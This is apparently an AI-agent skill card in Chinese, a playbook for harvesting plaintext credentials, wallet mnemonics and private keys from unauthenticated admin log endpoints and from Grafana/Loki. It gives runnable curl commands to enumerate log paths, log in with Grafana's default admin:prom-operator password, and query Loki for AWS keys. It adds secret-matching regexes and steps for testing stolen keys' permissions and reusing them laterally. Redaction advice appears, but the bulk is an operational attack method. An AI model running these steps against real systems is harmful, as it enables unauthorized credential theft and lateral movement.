---
name: log-endpoint-secret-harvest
description: >-
  Use when 后台/监控有 logs、api-logs、events、runtime-logs、统计接口未授权或低权可读：
  日志里常带明文云 AK/SK、Bot Token、助记词、代理账号。含 Loki/Grafana 检索语法、正则清单、
  BIP39 与 AKIA 取证、轮换无效判定、凭据处置顺序。
---

# 日志/统计接口 = 明文密钥矿脉

两个实战案例：① 某钱包后台 `/api/admin/api-logs` 未授权，返回**明文 BIP39 助记词**与私钥字段；② K8s 集群 Grafana 默认口令进 Loki，业务日志明文打印 S3 AK/SK、TG Bot Token、SOCKS5 账密。

## When to Use

- 后台有 `logs` / `api-logs` / `runtime-logs` / `events` / `stats` / `audit` 类接口
- 拿到 **Grafana / Kibana / Loki / ClickHouse / Sentry** 任一查询权限
- 应用有「请求日志 / 设备日志 / 回调日志」功能（第三方对接方视角能看到大量敏感体）
- 想验证「云凭据是否真在日志里，以及轮换有没有用」

## 一、先枚举，别猜

```bash
for p in api-logs api_logs logs runtime-logs events audit stats debug dump \
         admin/api-logs admin/logs api/admin/logs v1/logs; do
  code=$(curl -s -o /tmp/l.$RANDOM -w '%{http_code}' "https://目标/$p?page=1&limit=20" -b cookie.txt)
  echo "$code $p"
done
```

- 200 + JSON 数组 = 中；200 + 登录页 HTML = 没中（看 body 前 200 字节）
- 接口常支持 `?search=&date_from=&page=` —— 先按 `search=key|secret|token|mnemonic` 过滤

## 二、命中什么算金矿（正则清单）

```bash
# 云凭据
(AKIA|ASIA)[0-9A-Z]{16}          # AWS
(LTAI|AKID)[A-Za-z0-9]{12,}      # 腾讯云
AccessKey(Id|Secret)[^,}]{0,80}
# 支付/IM
[0-9]{8,10}:AA[0-9A-Za-z_-]{33}  # TG Bot Token
sk_live_[0-9a-zA-Z]{20,}         # Stripe
# 钱包
\b(abandon|zoo|ripple|squirrel|...){12}\b   # BIP39 十二词序列（拿 12 个连续小写词判断）
(0x)?[0-9a-fA-F]{64}             # 私钥
# 通用
"(pass(word)?|secret|token|privateKey|cipher)"\s*:\s*"[^"]{8,}"
```

- BIP39 命中后**先验真**：拿词表校验 checksum + 派生地址，与账上地址比对一致才算（别把日志里的随机词当助记词）
- 明文私钥/助记词属最高敏感：卡片、报告、聊天里一律写 `[REDACTED]`，只留「字段名 + 命中位置 + 校验结果」

## 三、Loki / Grafana 路线（有查询权限时）

```bash
# 1) 默认口令（Helm chart 老默认 admin/prom-operator）
curl -s -u admin:prom-operator https://grafana.目标/api/datasources | head

# 2) 拿 Loki uid 后直接查日志（Grafana 代理，绕开 Loki 直连）
curl -s -u admin:prom-operator \
 'https://grafana.目标/api/datasources/proxy/uid/<loki-uid>/loki/api/v1/query_range' \
 --data-urlencode 'query={namespace="app"} |= "AKIA"' --data-urlencode 'limit=50'

# 3) Loki 若 auth_enabled: false（单租户），任何租户头都能读全部命名空间
curl -s 'http://loki:3100/loki/api/v1/labels'
```

- 判定 `auth_enabled: false`：查 `{org_id}` 报错、数据源 jsonData 无 `X-Scope-OrgID`、跨 namespace 都能读
- 检索模板：`{namespace="x"} |= "secret"`、`|= "password"`、`|= "key"`、`|~ "AKIA|LTAI|sk_live"`

## 四、凭据处置顺序（拿到就先分级）

1. **只读验证**：STS `GetCallerIdentity` / `HeadBucket`，不写不删
2. **列权限**：列桶 / 列实例 / 列账号，判断能看多大面
3. **横向**：同 key 在别处复用（对象存储、CDN 刷新、短信、云函数）
4. **找根因**：日志属于哪行代码 / 哪个 Pod / 哪个 ORM 打印 —— 这决定「轮换有没有用」

**轮换无效判定**：换了 key 后 5-30 分钟内在日志里**再次出现新 key** → 根因在代码（打印整条消息体 / ORM 打印 SQL 参数 / 订单表存明文配置），单换 key 无效。实战案例里 `convert_orders.oss_configs` 每单存一份完整 S3 凭据，改日志也清不掉历史。

## 五、报告口径

- 每条写：`接口 / 字段名 / 命中条数 / 校验方式 / 是否可用于真实调用`
- 别写「疑似泄露」；要么复验成功，要么标「字段存在但未验证」
- 凭据类一律 `[REDACTED]`，只留前 4 位 + 长度

## 坑

1. 日志接口常分页限 50-100 条，`limit` 调大直接 400 —— 按 `page` 翻
2. 时间过滤参数名各站不同（`date_from` / `start` / `startTime` / `from`），枚举一遍
3. 有些「日志」是前端伪造的 mock，返回固定 3 条 —— 用不存在的时间段验证是否真查库
4. Grafana 改密**不会**吊销既有 session（实测），处置要显式踢会话

## 相关卡

- `unauthenticated-admin-api` — 管理 API 整面未鉴权
- `monitoring-plane-unauth-recon` — Prometheus/Grafana/exporter 零鉴权取数
- `heapdump-lanniao-hunter` — 堆转储里同类凭据
